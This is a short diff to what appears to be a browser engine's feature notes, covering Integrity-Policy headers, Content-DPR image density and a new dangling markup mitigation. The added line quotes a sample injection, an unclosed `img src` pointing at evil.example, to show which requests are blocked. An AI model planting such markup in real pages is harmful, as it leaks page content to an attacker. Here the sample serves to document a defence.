@@ -162,6 +162,8 @@ Assert.Equal(bytes, script.ContentBytes?.ToArray());
   `Integrity-Policy` header of a page blocks its scripts and style sheets (`blocked-destinations=(script style)`) that have
   no hash or are not CORS requests; `Integrity-Policy-Report-Only` only reports them (`integrity-violation` reports, sent to
   the `endpoints` of the policy).
+- As in the browsers, a request whose URL has both a newline or a tab and a `<` (e.g. `<img src='https://evil.example/?`
+  whose quote is not closed, which captures the markup that follows it) is blocked: the dangling markup mitigation.
 - The `Content-DPR` header of an image gives its density: its natural size is divided by it (`Content-DPR: 2` displays a
   100x100 image at 50x50 CSS pixels), in the `img` elements (where it replaces the density of the `srcset` candidate), the
   CSS images, the SVG `image` elements, the video posters and the image buttons.
